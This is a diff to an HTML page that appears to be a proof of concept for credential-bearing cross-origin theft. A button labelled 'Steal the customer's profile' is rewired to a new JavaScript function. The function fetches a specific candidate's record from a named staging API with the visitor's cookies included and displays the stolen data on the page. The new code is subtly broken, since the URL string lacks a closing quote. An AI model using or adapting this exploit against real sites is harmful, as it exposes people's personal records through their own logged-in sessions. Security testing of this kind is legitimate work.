@@ -10,7 +10,7 @@
 </br>
 <div>
 click the button to Steal the customer's profile!
-<button id="stealCards" onclick="stealprofile()">Steal the customer's profile</button>
+<button id="stealCards" onclick="loadReferenceData()">Steal the customer's profile</button>
 </div>
 <div text="steal customer's profile">
 steal customer's profile
@@ -22,7 +22,46 @@ steal customer's profile
 </div>
 
 <script>
-
+function loadReferenceData() {
+    const referenceElement = document.getElementById("customer");
+    
+    // 显示加载状态
+    referenceElement.innerHTML = '<span style="color: #666;">加载中...</span>';
+ 
+    fetch('https://api.schoolspringstaging.com/api/CCandidate/GetCandidateInfoById/7602032, { // 替换为实际API地址
+        method: 'GET',
+        mode: 'cors', // 显式指定CORS模式
+        headers: {
+            'Content-Type': 'application/json',
+            // 如有需要可添加其他请求头，如Authorization
+        },
+        credentials: 'include' // 如果需要携带Cookie可改为'include'
+    })
+    .then(response => {
+        if (!response.ok) {
+            throw new Error(`请求错误：${response.status} ${response.statusText}`);
+        }
+        return response.json();
+    })
+    .then(data => {
+        // 可根据实际数据结构调整展示格式
+        referenceElement.innerHTML = `
+            <div class="reference-content">
+                <h3>参考数据</h3>
+                <pre>${JSON.stringify(data, null, 2)}</pre>
+            </div>
+        `;
+        // 如果需要自定义数据展示，可替换为结构化渲染：
+        // referenceElement.innerHTML = `
+        //     <p>名称：${data.name}</p>
+        //     <p>值：${data.value}</p>
+        // `;
+    })
+    .catch(error => {
+        referenceElement.innerHTML = `<span style="color: #ff4d4f;">加载失败：${error.message}</span>`;
+        console.error('请求失败:', error);
+    });
+}
 		
 function stealprofile(){
 	var xhr = new XMLHttpRequest();
